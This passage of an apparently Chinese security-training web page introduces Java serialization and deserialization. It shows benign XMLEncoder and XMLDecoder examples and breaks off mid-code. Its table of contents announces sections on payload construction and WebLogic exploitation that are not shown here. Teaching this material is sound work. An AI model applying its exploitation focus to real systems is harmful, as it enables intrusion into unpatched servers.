@@ -1,0 +1,1218 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-8.1.3">
+    
+    
+      
+        <title>Java deserialization - Learn Security</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.edf004c2.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.e6a45f82.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#02a6f2">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="light-blue" data-md-color-accent="">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../.." title="Learn Security" class="md-header__button md-logo" aria-label="Learn Security" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Learn Security
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Java deserialization
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="清空当前内容" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Learn Security" class="md-nav__button md-logo" aria-label="Learn Security" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    Learn Security
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        Learn Security
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          Poc
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Poc" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Poc
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../poc/webmin/" class="md-nav__link">
+        Webmin
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          Tools
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Tools" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Tools
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tools/burpsuite/" class="md-nav__link">
+        Burpsuite 简介
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tools/info_collect/" class="md-nav__link">
+        信息收集
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tools/msf/" class="md-nav__link">
+        Metasploit-Framework 简介
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tools/xray/" class="md-nav__link">
+        Xray 漏洞扫描
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4">
+          Web
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Web" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          Web
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../authentication_attack/" class="md-nav__link">
+        Authentication attack
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cookie_session/" class="md-nav__link">
+        Cookie session
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../csrf/" class="md-nav__link">
+        CSRF
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../file_include/" class="md-nav__link">
+        文件包含漏洞
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../file_upload/" class="md-nav__link">
+        文件上传漏洞
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Java deserialization
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Java deserialization
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    序列化与反序列化
+  </a>
+  
+    <nav class="md-nav" aria-label="序列化与反序列化">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    序列化原因
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xmlencoder" class="md-nav__link">
+    XMLEncoder
+  </a>
+  
+    <nav class="md-nav" aria-label="XMLEncoder">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#encoder" class="md-nav__link">
+    encoder
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#decoder" class="md-nav__link">
+    decoder
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#decoder_mod" class="md-nav__link">
+    decoder_mod
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    反序列化原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    反序列化漏洞挖掘
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#java" class="md-nav__link">
+    Java系统命令执行
+  </a>
+  
+    <nav class="md-nav" aria-label="Java系统命令执行">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    调用系统计算器
+  </a>
+  
+    <nav class="md-nav" aria-label="调用系统计算器">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#javalangruntime" class="md-nav__link">
+    java.lang.Runtime
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#javalangprocessbuilder" class="md-nav__link">
+    java.lang.ProcessBuilder
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#windows" class="md-nav__link">
+    Windows
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#macos" class="md-nav__link">
+    MacOS
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#payload" class="md-nav__link">
+    反序列化Payload构造
+  </a>
+  
+    <nav class="md-nav" aria-label="反序列化Payload构造">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xml-payload" class="md-nav__link">
+    XML 单参数 Payload 构造
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xml-payload_1" class="md-nav__link">
+    XML 多参数 Payload 构造
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#weblogic" class="md-nav__link">
+    Weblogic反序列化漏洞分析
+  </a>
+  
+    <nav class="md-nav" aria-label="Weblogic反序列化漏洞分析">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cve-2017-3506" class="md-nav__link">
+    CVE-2017-3506 漏洞简介
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    反序列化实战中的利用方法
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../middleware/" class="md-nav__link">
+        常见中间件及漏洞
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sql_injection/" class="md-nav__link">
+        SQL 注入漏洞
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    序列化与反序列化
+  </a>
+  
+    <nav class="md-nav" aria-label="序列化与反序列化">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    序列化原因
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xmlencoder" class="md-nav__link">
+    XMLEncoder
+  </a>
+  
+    <nav class="md-nav" aria-label="XMLEncoder">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#encoder" class="md-nav__link">
+    encoder
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#decoder" class="md-nav__link">
+    decoder
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#decoder_mod" class="md-nav__link">
+    decoder_mod
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    反序列化原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    反序列化漏洞挖掘
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#java" class="md-nav__link">
+    Java系统命令执行
+  </a>
+  
+    <nav class="md-nav" aria-label="Java系统命令执行">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    调用系统计算器
+  </a>
+  
+    <nav class="md-nav" aria-label="调用系统计算器">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#javalangruntime" class="md-nav__link">
+    java.lang.Runtime
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#javalangprocessbuilder" class="md-nav__link">
+    java.lang.ProcessBuilder
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#windows" class="md-nav__link">
+    Windows
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#macos" class="md-nav__link">
+    MacOS
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#payload" class="md-nav__link">
+    反序列化Payload构造
+  </a>
+  
+    <nav class="md-nav" aria-label="反序列化Payload构造">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xml-payload" class="md-nav__link">
+    XML 单参数 Payload 构造
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xml-payload_1" class="md-nav__link">
+    XML 多参数 Payload 构造
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#weblogic" class="md-nav__link">
+    Weblogic反序列化漏洞分析
+  </a>
+  
+    <nav class="md-nav" aria-label="Weblogic反序列化漏洞分析">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cve-2017-3506" class="md-nav__link">
+    CVE-2017-3506 漏洞简介
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    反序列化实战中的利用方法
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+
+  <h1>Java deserialization</h1>
+
+<h2 id="_1">序列化与反序列化</h2>
+<ul>
+<li>Java序列化和反序列化的代码原理以及工作流程</li>
+<li>Java反序列化漏洞的形成原因</li>
+<li>Java反序列化漏洞的挖掘思路</li>
+</ul>
+<p>序列化是将Java对象转换成字节流的过程, 而反序列化是将字节流转换成Java对象的过程</p>
+<p>序列化和反序列化的目的是为了更方便进行数据和对象的存储, 网络传输</p>
+<h3 id="_2">序列化原因</h3>
+<ul>
+<li>
+<p>内存中存在大量的对象, 会让内存负担过重, 像session对象, 如果有数以万计用户并发访问, 那就会同样出现数以万计的 session对象, 这时Web应用会将一些session先序列化存储在硬盘中, 等需要使用的时候, 再将其反序列化, 还原到内存中, 节约计算机内存资源</p>
+</li>
+<li>
+<p>在进行远程过程调用时, 需要在网络上传输 JavaBean 的对象, 而网络上只允许二进制形式的数据进行传输, 这算是需要用到序列化技术</p>
+</li>
+</ul>
+<h3 id="xmlencoder">XMLEncoder</h3>
+<h4 id="encoder">encoder</h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="kn">import</span> <span class="nn">java.beans.XMLEncoder</span><span class="p">;</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2"></a><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="p">;</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3"></a><span class="kn">import</span> <span class="nn">java.util.ArrayList</span><span class="p">;</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4"></a><span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="p">;</span>
+<a id="__codelineno-0-5" name="__codelineno-0-5"></a>
+<a id="__codelineno-0-6" name="__codelineno-0-6"></a><span class="kd">public</span> <span class="kd">class</span> <span class="nc">encoder</span> <span class="p">{</span>
+<a id="__codelineno-0-7" name="__codelineno-0-7"></a>
+<a id="__codelineno-0-8" name="__codelineno-0-8"></a>  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="p">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="p">,</span> <span class="n">InterruptedException</span> <span class="p">{</span>
+<a id="__codelineno-0-9" name="__codelineno-0-9"></a>
+<a id="__codelineno-0-10" name="__codelineno-0-10"></a>    <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span>  <span class="c1">//创建HashMap散列集</span>
+<a id="__codelineno-0-11" name="__codelineno-0-11"></a>    <span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;name&quot;</span><span class="p">,</span> <span class="s">&quot;Rookie&quot;</span><span class="p">);</span>  <span class="c1">//key Name 放入字符串</span>
+<a id="__codelineno-0-12" name="__codelineno-0-12"></a>    <span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;LV&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>  <span class="c1">//key LV 放入数值</span>
+<a id="__codelineno-0-13" name="__codelineno-0-13"></a>
+<a id="__codelineno-0-14" name="__codelineno-0-14"></a>    <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">arrayList</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span><span class="p">();</span>
+<a id="__codelineno-0-15" name="__codelineno-0-15"></a>    <span class="n">arrayList</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="s">&quot;Sword&quot;</span><span class="p">);</span>
+<a id="__codelineno-0-16" name="__codelineno-0-16"></a>    <span class="n">arrayList</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="s">&quot;Shield&quot;</span><span class="p">);</span>
+<a id="__codelineno-0-17" name="__codelineno-0-17"></a>    <span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&quot;Equipment&quot;</span><span class="p">,</span> <span class="n">arrayList</span><span class="p">);</span>  <span class="c1">//key Equipment 放入可动态修改的数组</span>
+<a id="__codelineno-0-18" name="__codelineno-0-18"></a>
+<a id="__codelineno-0-19" name="__codelineno-0-19"></a>    <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;map = &quot;</span> <span class="o">+</span> <span class="n">map</span><span class="p">);</span>  <span class="c1">//map = {Equipment=[Sword, Shield], LV=1, Name=Rookie}</span>
+<a id="__codelineno-0-20" name="__codelineno-0-20"></a>
+<a id="__codelineno-0-21" name="__codelineno-0-21"></a>    <span class="n">XMLEncoder</span> <span class="n">xmlEncoder</span> <span class="o">=</span> <span class="k">new</span> <span class="n">XMLEncoder</span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">);</span>
+<a id="__codelineno-0-22" name="__codelineno-0-22"></a>    <span class="n">xmlEncoder</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">map</span><span class="p">);</span>  <span class="c1">//实例化 XMLEncoder 对象并将 map 散列集序列化编码</span>
+<a id="__codelineno-0-23" name="__codelineno-0-23"></a>
+<a id="__codelineno-0-24" name="__codelineno-0-24"></a>    <span class="n">xmlEncoder</span><span class="p">.</span><span class="na">close</span><span class="p">();</span>
+<a id="__codelineno-0-25" name="__codelineno-0-25"></a>  <span class="p">}</span>
+<a id="__codelineno-0-26" name="__codelineno-0-26"></a><span class="p">}</span>
+</code></pre></div>
+<h4 id="decoder">decoder</h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="kn">import</span> <span class="nn">java.beans.XMLDecoder</span><span class="p">;</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2"></a><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="p">;</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3"></a><span class="kn">import</span> <span class="nn">java.io.StringBufferInputStream</span><span class="p">;</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4"></a>
+<a id="__codelineno-1-5" name="__codelineno-1-5"></a><span class="kn">import</span> <span class="nn">javax.sql.rowset.spi.XmlReader</span><span class="p">;</span>
+<a id="__codelineno-1-6" name="__codelineno-1-6"></a>
+<a id="__codelineno-1-7" name="__codelineno-1-7"></a><span class="kd">public</span> <span class="kd">class</span> <span class="nc">decoder</span> <span class="p">{</span>
+<a id="__codelineno-1-8" name="__codelineno-1-8"></a>
+<a id="__codelineno-1-9" name="__codelineno-1-9"></a>  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="p">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="p">,</span> <span class="n">InterruptedException</span> <span class="p">{</span>
+<a id="__codelineno-1-10" name="__codelineno-1-10"></a>    <span class="n">String</span> <span class="n">s</span> <span class="o">=</span> <span class="s">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot;</span>
+<a id="__codelineno-1-11" name="__codelineno-1-11"></a>        <span class="o">+</span> <span class="s">&quot;&lt;java version=\&quot;11.0.13\&quot; class=\&quot;java.beans.XMLDecoder\&quot;&gt;\n&quot;</span> <span class="o">+</span> <span class="s">&quot;&lt;Object class=\&quot;java.util.HashMap\&quot;&gt;\n&quot;</span>
+<a id="__codelineno-1-12" name="__codelineno-1-12"></a>        <span class="o">+</span> <span class="s">&quot;&lt;void method=\&quot;put\&quot;&gt;\n&quot;</span> <span class="o">+</span> <span class="s">&quot;&lt;string&gt;Equipment&lt;/string&gt;\n&quot;</span> <span class="o">+</span> <span class="s">&quot;&lt;object class=\&quot;java.util.ArrayList\&quot;&gt;\n&quot;</span>
+<a id="__codelineno-1-13" name="__codelineno-1-13"></a>        <span class="o">+</span> <span class="s">&quot;&lt;void method=\&quot;add\&quot;&gt;\n&quot;</span> <span class="o">+</span> <span class="s">&quot;&lt;string&gt;Sword&lt;/string&gt;\n&quot;</span> <span class="o">+</span> <span class="s">&quot;&lt;/void&gt;\n&quot;</span> <span class="o">+</span> <span class="s">&quot;&lt;void method=\&quot;add\&quot;&gt;\n&quot;</span>
+<a id="__codelineno-1-14" name="__codelineno-1-14"></a>        <span class="o">+</span> <span class="s">&quot;&lt;string&gt;Shield&lt;/string&gt;\n&quot;</span> <span class="o">+</span> <span class="s">&quot;&lt;/void&gt;\n&quot;</span> <span class="o">+</span> <span class="s">&quot;&lt;/object&gt;\n&quot;</span> <span class="o">+</span> <span class="s">&quot;&lt;/void&gt;\n&quot;</span> <span class="o">+</span> <span class="s">&quot;&lt;void method=\&quot;put\&quot;&gt;\n&quot;</span>
+<a id="__codelineno-1-15" name="__codelineno-1-15"></a>        <span class="o">+</span> <span class="s">&quot;&lt;string&gt;LV&lt;/string&gt;\n&quot;</span> <span class="o">+</span> <span class="s">&quot;&lt;int&gt;1&lt;/int&gt;\n&quot;</span> <span class="o">+</span> <span class="s">&quot;&lt;/void&gt;\n&quot;</span> <span class="o">+</span> <span class="s">&quot;&lt;void method=\&quot;put\&quot;&gt;\n&quot;</span>
+<a id="__codelineno-1-16" name="__codelineno-1-16"></a>        <span class="o">+</span> <span class="s">&quot;&lt;string&gt;Name&lt;/string&gt;\n&quot;</span> <span class="o">+</span> <span class="s">&quot;&lt;string&gt;Rookie&lt;/string&gt;\n&quot;</span> <span class="o">+</span> <span class="s">&quot;&lt;/void&gt;\n&quot;</span> <span class="o">+</span> <span class="s">&quot;&lt;/object&gt;\n&quot;</span> <span class="o">+</span> <span class="s">&quot;&lt;/java&gt;&quot;</span><span class="p">;</span>
+<a id="__codelineno-1-17" name="__codelineno-1-17"></a>    <span class="n">StringBufferInputStream</span> <span class="n">stringBufferInputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBufferInputStream</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+<a id="__codelineno-1-18" name="__codelineno-1-18"></a>    <span class="n">XMLDecoder</span> <span class="n">xmlDecoder</span> <span class="o">=</span> <span class="k">new</span> <span class="n">XMLDecoder</span><span class="p">(</span><span class="n">stringBufferInputStream</span><span class="p">);</span>
+<a id="__codelineno-1-19" name="__codelineno-1-19"></a>    <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">xmlDecoder</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span>
+<a id="__codelineno-1-20" name="__codelineno-1-20"></a>    <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">o</span><span class="p">);</span>
+<a id="__codelineno-1-21" name="__codelineno-1-21"></a>
